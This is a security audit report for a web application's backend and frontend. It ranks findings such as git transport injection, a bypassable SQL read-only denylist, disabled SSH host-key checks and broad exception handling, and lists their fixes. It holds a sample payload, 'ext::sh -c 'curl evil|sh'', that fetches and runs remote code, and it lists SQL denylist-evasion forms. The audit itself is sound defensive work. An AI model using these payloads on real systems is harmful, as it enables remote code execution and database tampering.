# Codebase Audit — 2026-06-23

**Scope:** backend `backend/app/` (78,305 LOC, 316 files) + frontend `frontend/src/` (252 files).
**Method:** docs-first (CLAUDE.md, vision.md §7 invariants, ARCHITECTURE.md), then the `code-reviewer` skill's automated structural analyzer for a baseline, then targeted manual review of security/invariant-critical paths and cross-cutting anti-pattern sweeps with file:line verification. Findings were verified against the code, not trusted from prior scans.
**Coverage honesty:** security/invariant-critical paths (connectors, safety, repo ingestion, credential handling, auth surfaces, MCP gating, frontend auth/XSS) were read line-by-line. The largest agent/knowledge files (orchestrator, sql_agent, stage_executor) received structural + targeted review, not exhaustive line-by-line. Areas marked *(structural only)* below are candidates for a deeper pass.

**Automated baseline:** backend grade **B** (avg 83/100, 1,934 code smells, 55 SOLID violations); frontend grade **A** (avg 93.5/100, 563 smells, 7 SOLID).

---

## Remediation status (2026-06-24)

- **H1 — FIXED:** `app/knowledge/repo_url.py` (`validate_repo_url` transport allowlist) wired into `RepoAnalyzer` (both git sinks) + `GIT_ALLOW_PROTOCOL=http:https:ssh` pinned; validators on `RepoCheckRequest` and `ProjectCreate/Update`. Tests: `test_repo_url.py` (17).
- **M1 — FIXED:** `core/safety.py` denylist extended (COPY / INTO OUTFILE/DUMPFILE / LOAD DATA / REPLACE INTO / CALL / DO) + SQL-comment stripping (defeats `DELETE/**/FROM`). Tests: `test_safety_hardening.py` (18). *(Connector-level read-only session remains a recommended deeper defense-in-depth.)*
- **M2 — FIXED:** git SSH `StrictHostKeyChecking=no` → `accept-new` (TOFU).
- **M3 — FIXED:** `core/background.py` `spawn_tracked()` (strong ref + exception logging) replaces the two fire-and-forget `create_task` sites (`projects.py`, `runs.py`). Tests: `test_background.py` (2).
- **M4 (god-files), M5 (broad excepts):** deferred — larger refactors, tracked for a follow-up pass.

3826 backend unit tests pass; ruff + mypy clean.

## Severity-ranked findings

### 🔴 HIGH

**H1 — Git transport/option injection → authenticated RCE (`repo_url`)**
- **Where:** `app/api/routes/repos.py:779` (`repo_url: str = Field(max_length=2000)` — length cap only, no scheme validation) → `app/knowledge/repo_analyzer.py:275` (`subprocess.run(["git","ls-remote","--heads", repo_url], …)`) and `repo_analyzer.py:419` (`Repo.clone_from(repo_url, …)`). No `GIT_ALLOW_PROTOCOL` / `protocol.ext.allow=never` anywhere in `app/`.
- **Why it matters:** list-arg subprocess prevents *shell* injection, but git itself honors remote-helper transports. A project owner/editor can set `repo_url = "ext::sh -c 'curl evil|sh'"` (or other `ext::`/option-injection payloads). The `POST /api/repos/.../check-access` endpoint passes it straight to `git ls-remote` **before the repo is even saved**, so the command executes on the web/worker dyno → **authenticated remote code execution** (cross-tenant data/credential exposure). Confirmed: no scheme allowlist, no protocol restriction.
- **Fix:** validate `repo_url` against an allowlist of schemes (`https://`, `http://`, `ssh://`, `git@host:path`); reject values beginning with `-` (option injection) and the `ext::`/`fd::` transports; and set `GIT_ALLOW_PROTOCOL=https:ssh` (or `-c protocol.ext.allow=never -c protocol.allow=...`) in the git subprocess env. Apply at the Pydantic model (`repos.py`) **and** in `repo_analyzer` defense-in-depth.

### 🟠 MEDIUM-HIGH

**M1 — Read-only invariant rests on a bypassable regex denylist (`core/safety.py`)**
- **Where:** `app/core/safety.py:16-70` — `DANGEROUS_PATTERNS_SQL` + `DML_PATTERNS_SQL` regexes; wired via `core/validation_loop.py:71` (`SafetyLevel.READ_ONLY if is_read_only else ALLOW_DML`). Connectors (`connectors/postgres.py` etc.) do **not** open read-only DB sessions; `is_read_only` is never referenced in any connector's `execute_query`. So the regex is effectively the only barrier when the connection's DB user has write privileges.
- **Why it matters:** it's a denylist (not a SELECT allowlist), so it misses:
  - `COPY … TO/FROM PROGRAM '…'` (PostgreSQL → shell exec on the DB server)
  - `SELECT … INTO OUTFILE '…'` / `LOAD DATA INFILE` (MySQL file write/read)
  - `REPLACE INTO`, `CALL proc()`, `DO $$ … $$`, `SELECT a_volatile_writing_function()`
  - comment-as-separator: `DELETE/**/FROM t` evades `\bDELETE\s+FROM\b` (which requires `\s+`), yet most engines execute it
  - `SELECT … INTO newtable`
  This is vision invariant #1 ("DML blocked unless explicitly unlocked"). Highest exposure: the MCP raw-SQL path (`mcp_server/tools.py:503`) and any prompt-injected SQL on a full-privilege connection.
- **Fix (defense-in-depth):** (1) open genuinely read-only sessions at the connector layer — PG `SET default_transaction_read_only = on` / `SET TRANSACTION READ ONLY`, MySQL read-only intent; (2) prefer a real SQL parser (e.g. `sqlglot`) with a **SELECT/CTE-read allowlist** over regex; (3) until then, extend the denylist with `COPY`, `OUTFILE`, `INFILE`, `REPLACE`, `CALL`, `DO`, and normalize comments before matching.

### 🟡 MEDIUM

**M2 — `StrictHostKeyChecking=no` on git-over-SSH** — `repo_analyzer.py:258` & `:272` set `GIT_SSH_COMMAND="ssh … -o StrictHostKeyChecking=no"`. MITM exposure on private-repo clone/fetch. The DB SSH path uses a TOFU/strict policy (`SSH_HOST_KEY_POLICY`); git SSH should match it (known_hosts / TOFU) rather than disabling verification.

**M3 — Unreferenced `asyncio.create_task` (fire-and-forget)** — `knowledge/pipeline_runner.py:1428` (`asyncio.create_task(_parse_one(rp))` in a loop), `api/routes/projects.py:560`, `api/routes/runs.py:183`. Unreferenced tasks can be garbage-collected before completion and their exceptions are silently dropped. Keep a strong reference (a task set) and attach a done-callback that logs exceptions; for the pipeline loop, `asyncio.gather` the parses.

**M4 — God-files / long functions (1,934 smells, grade B)** — `agents/orchestrator.py` (2,525 LOC), `agents/sql_agent.py` (2,017), `knowledge/pipeline_runner.py` (1,769), `api/routes/chat.py` (1,724), `services/agent_learning_service.py` (1,259), `main.py` (1,248), `api/routes/connections.py` (1,199). High blast-radius for edits, hard to test in isolation, hard to reason about. Decompose by responsibility (extract per-stage / per-concern modules). *(structural — not a behavioral bug, but the dominant maintainability risk.)*

**M5 — Silent error swallowing** — 51 `except …: pass` blocks and 516 `except Exception` handlers across `app/`. Several are benign best-effort (cache writes: `core/query_cache.py`, `services/geoip_cache.py`), but blanket swallowing in request paths (`api/routes/chat.py`, `api/routes/health_monitor.py`) can hide real failures, in tension with vision invariant #5 (honest degradation) and the project's "never swallow errors silently" rule. Narrow the exception types and log at an appropriate level; reserve bare `pass` for provably-benign cleanup.

### 🟢 LOW / NOTES

- **L1** — Suppression debt: 47 `# type: ignore`, 104 `# noqa` in `app/` (type-safety/lint gaps to revisit). `0` TODO/FIXME/HACK markers (clean).
- **L2** — `dangerouslySetInnerHTML` appears only in marketing pages (`about/contact/support/pricing/page.tsx`) — JSON-LD SEO schema; confirm the injected object is fully static (no user input) — almost certainly safe, but worth an assertion.

### ✅ Verified-good (explicitly checked, no issue)

- **SQL identifier quoting** — `connectors/base.py:262` `_quote_identifier` correctly doubles `"`/`` ` `` ; the f-string SQL (`{quoted}`, `{col_q}`) is identifier-safe and limits are int-typed. No injection there.
- **Credential exposure (invariant #2)** — `ConnectionResponse` (`api/routes/connections.py:394`) returns no `db_password`, SSH private key, or `mcp_env` (only `ssh_key_id` reference). Secrets are Fernet-encrypted (`services/encryption.py`) and decrypted only server-side (`ssh_key_service.py`, `connection_service.py`).
- **SSH pre-command allowlist** — `connectors/ssh_pre_commands.py` rejects shell metacharacters (`;&|`, newlines) and enforces a regex allowlist (F-SEC-5). Solid.
- **Frontend auth** — no JWT in `localStorage` (only the non-sensitive `auth_user` profile); token lives in memory / httpOnly cookie per design. No token leak.
- **LLM keys** — no API-key/secret logging found in `app/` (only benign auth-failure logs). No hardcoded secrets in source.
- **MCP read-only gating** — `mcp_server/tools.py:503` restricts raw SQL to read-only connections (subject to M1's regex robustness).

---

## Per-module summary

| Module | Assessment | Findings |
|---|---|---|
| `connectors/` | Quoting ✅; read-only relies on `core/safety.py` (see M1); no read-only DB session | M1 |
| `core/` | `safety.py` is the read-only guard (regex, bypassable); `ssh_pre_commands` solid; rate_limit/audit *(structural only)* | M1 |
| `knowledge/repo_analyzer.py` | git ingestion | **H1**, M2, M3 |
| `knowledge/pipeline_runner.py` | checkpointed indexer | M3, M4 (1,769 LOC) *(structural only)* |
| `knowledge/*` (ast_parser, entity_extractor, code_graph, db_index_pipeline) | large; identifier SQL is quoted ✅ | M4; *(structural only)* |
| `api/routes/connections.py` | response model clean ✅ | M4 (1,199 LOC) |
| `api/routes/repos.py` | repo_url unvalidated | **H1** |
| `api/routes/chat.py` | god-file | M4 (1,724 LOC), M5 *(structural only)* |
| `agents/orchestrator.py`, `sql_agent.py`, `stage_executor.py`, `tool_dispatcher.py` | core agent loop | M4 (god-files) *(structural only — recommend a dedicated logic pass)* |
| `services/` | encryption ✅, ssh_key_service ✅, agent_learning_service god-file | M4 |
| `llm/` | no key logging ✅ | *(structural only)* |
| `mcp_server/` | read-only gating present; per-request auth hardened (recent work) | (subject to M1) |
| `frontend/src/` | grade A; auth/token ✅; XSS surface = static JSON-LD | L2 |

---

## Recommended order of remediation

1. **H1** (repo_url scheme allowlist + `GIT_ALLOW_PROTOCOL`) — small, high-impact, ship first.
2. **M1** (read-only DB sessions at the connector layer + denylist hardening / sqlglot allowlist).
3. **M2** (git SSH host-key verification), **M3** (task references).
4. **M5** (narrow/log broad excepts in request paths), **M4** (decompose god-files — fold into the ongoing dashboard-rebuild altitude work).
